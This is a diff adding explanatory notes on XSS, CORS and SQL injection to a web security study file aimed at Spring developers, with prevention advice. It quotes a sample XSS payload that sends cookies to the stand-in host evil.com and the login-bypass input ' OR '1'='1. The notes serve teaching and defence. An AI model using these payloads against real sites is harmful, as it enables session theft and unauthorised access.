@@ -32,3 +32,28 @@ By default, Spring Security enables CSRF protection for web apps with forms,
 but in REST APIs (stateless systems) CSRF is usually disabled and replaced with token-based authentication like JWT.
 This mechanism ensures that attackers cannot forge valid requests on behalf of legitimate users.
 
+🔹 XSS (Cross-Site Scripting)
+----------------------------------
+XSS is a security vulnerability where attackers inject harmful scripts (usually JavaScript) into a trusted website.
+When other users load the page, the script executes in their browser, allowing the attacker to steal cookies, session tokens, or manipulate content.
+For example, a user could post a comment like <script>document.location='http://evil.com/steal?cookie='+document.cookie</script> on a blog site.
+Preventing XSS involves validating and escaping user input, using frameworks that auto-escape HTML (like Thymeleaf), and applying HTTP headers like Content-Security-Policy (CSP).
+Spring Security helps by adding built-in XSS filters and headers.
+
+🔹 CORS (Cross-Origin Resource Sharing)
+---------------------------------------------
+CORS is a security mechanism in browsers that restricts web pages from making requests to a different domain, port, or protocol than the one that served the web page.
+For example, if your frontend runs on http://localhost:3000 and your backend API runs on http://localhost:8080, the browser will block requests unless CORS is allowed.
+To enable safe cross-origin communication, the server must send specific HTTP headers like Access-Control-Allow-Origin, Access-Control-Allow-Methods, and Access-Control-Allow-Headers.
+In Spring Boot, you can enable CORS globally using WebMvcConfigurer or at the controller level using @CrossOrigin.
+This helps frontend apps (like React or Angular) communicate securely with backend services without violating browser policies.
+
+SQL Injection:-
+--------------------
+SQL Injection is a class of vulnerability where an attacker supplies specially crafted input that gets concatenated into an application's SQL query, causing the database to execute unintended commands.
+It occurs when user input is used directly in SQL statements without proper handling, letting the attacker modify query logic (e.g., bypass authentication, exfiltrate or destroy data).
+A classic example is sending username: ' OR '1'='1 to a login query so it always returns true.
+Consequences include data theft, data corruption, privilege escalation, and full system compromise depending on DB permissions.
+SQL injection is prevented primarily by never building SQL with string concatenation — instead use parameterized queries / prepared statements or ORM parameter binding.
+Additional protections: input validation, least-privilege DB accounts, stored procedures (used correctly), escaping when necessary, and runtime defenses like WAFs and query-logging/monitoring.
+Always assume input is hostile and design DB access layers accordingly.
